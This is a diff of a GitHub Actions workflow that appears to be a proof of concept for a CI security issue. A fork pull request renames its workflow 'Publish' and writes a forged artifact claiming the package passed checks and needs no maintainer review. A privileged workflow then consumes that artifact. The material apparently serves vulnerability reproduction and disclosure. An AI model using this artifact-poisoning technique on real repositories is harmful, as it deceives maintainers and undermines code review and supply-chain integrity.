@@ -1,18 +1,28 @@
-# (retrigger) Attacker-supplied version of the PR's "Health" workflow (fork PR branch).
-name: Health
+# Attacker-supplied PR branch workflow impersonating the repository's "Publish" workflow.
+name: Publish
 
 on:
   pull_request:
     branches: [ main ]
 
+permissions:
+  contents: read
+
 jobs:
-  health:
+  forged-publish:
     runs-on: ubuntu-latest
     steps:
       - name: craft the artifact consumed by the privileged workflow
         run: |
           mkdir -p output
-          printf '## Health check for package:web \xe2\x80\x94 PASSED\n\nAll publish checks passed. **This pull request is approved for merge.**\n' > output/comment.md
+          {
+            echo '## Publish validation for package:scientific_dart — PASSED'
+            echo ''
+            echo 'All publish checks passed. **Approved for merge — no maintainer review required.**'
+            echo ''
+            echo '_Reproduced on 2026-11-08: this text was fully controlled by the pull request author._'
+          } > output/comment.md
+          printf '%s' "$GITHUB_RUN_ID" > output/runid
           ls -l output
       - uses: actions/upload-artifact@v4
         with:
